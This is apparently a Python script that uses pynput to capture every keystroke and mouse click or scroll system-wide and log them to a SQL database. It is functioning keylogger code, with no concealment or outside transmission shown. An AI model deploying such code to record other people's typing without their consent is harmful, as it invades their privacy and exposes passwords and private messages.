#!/usr/bin/python3
from _globals_ import *
from _sql_functions_ import *
from pynput import keyboard as kb, mouse as ms

def initListeners():
    global key_listener, mouse_listener;
    key_listener = kb.Listener(on_release = onKeyRelease);
    key_listener.start();
    mouse_listener = ms.Listener(on_click=onMouseClick, on_scroll=onMouseScroll);
    mouse_listener.start();
 
def onKeyRelease( key ):
    try:
        sqlKeyRecordAppend( key.char );
    except:
        if (key == kb.Key.enter):
            sqlKeyRecordAppend( " <enter> ")
        elif (key == kb.Key.space):
            sqlKeyRecordAppend( " <space> ");
        else:
            sqlKeyRecordAppend( " <{}> ".format(key.name) );
def onMouseScroll(x, y, dx, dy):
    if (dx!=0): 
        sqlMouseRecordAppend( "<scrolled {} at {}\t".format( "left" if dx<0 else "right", (x,y)) );
    if (dy!=0): 
        sqlMouseRecordAppend( "<scrolled {} at {}\t".format( 'down' if dy<0 else 'up', (x,y)) );
def onMouseClick(x, y, button, pressed):
    sqlMouseRecordAppend( "<{}-{} at {}\t".format(button.name, "clicked" if pressed else "released",(x,y)) );


